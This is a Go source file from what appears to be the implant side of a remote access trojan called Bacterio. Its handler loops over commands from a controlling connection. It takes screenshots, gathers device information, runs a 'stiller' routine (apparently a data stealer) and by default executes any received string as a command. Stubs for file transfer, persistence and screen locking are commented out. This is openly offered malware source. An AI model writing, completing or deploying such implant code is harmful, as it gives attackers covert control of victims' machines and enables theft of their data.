package handler

import (
	"io"
	"strings"

	"github.com/fatih/color"
	service "github.com/fr13n8/Bacterio/pkg/service/implant"
)

type Handler struct {
	services *service.Service
}

func NewHandler(services *service.Service) *Handler {
	return &Handler{services: services}
}

func (h Handler) Handle() error {
	err := h.services.Device.GetInfoAboutDevice()
	if err != nil {
		return err
	}

	for {
		message, err := h.services.Device.Read()
		if err != nil {
			switch err {
			case io.EOF:
				color.Red("client closed the connection by terminating the process")
			default:
				color.Red("error reading from connection")
			}
			break
		}

		switch strings.TrimSpace(message.Command) {
		case "information":
			h.services.Device.GetInfoAboutDevice()
		case "screenshot":
			h.services.Device.TakeScreenshot()
		case "download":
			// c.UseCase.Download.File(message.Data)
		case "upload":
			// c.UseCase.Upload.File(message.Data)
		case "persistence":
			// c.UseCase.Persistence.Persist(message.Data)
		case "open-url":
			// c.UseCase.OpenURL.Open(string(message.Data))
		case "lockscreen":
			// c.UseCase.LockScreen.Lock()
		case "stiller":
			h.services.Device.RunStiller()
		default:
			h.services.Device.Run(string(message.Command))
		}
	}
	return nil
}
